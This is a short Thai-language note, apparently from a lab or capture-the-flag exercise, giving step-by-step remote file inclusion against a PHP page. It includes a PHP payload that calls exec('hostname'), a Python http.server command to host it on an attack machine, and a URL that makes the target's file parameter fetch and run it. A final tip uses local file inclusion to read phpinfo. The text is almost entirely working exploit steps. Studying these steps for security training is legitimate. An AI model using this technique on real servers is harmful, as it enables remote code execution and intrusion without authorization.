-สร้างไฟล์ host.txt ไว้ใน attack box
    host.txt = 
    <?php
    print exec('hostname');
    ?>
-ในเครื่อง attack box รัน python3 -m http.server
-ในเครื่อง target Url: xxxxx/playground.php?file=http://{ipของattack_box:port}/host.txt

ผลที่ได้หากสำเร็จคือ hostname ของ target มาแสดง


ตรวจ php settings (ถ้ามี LFI ถึงไฟล์ phpinfo):
?file=/path/to/phpinfo.php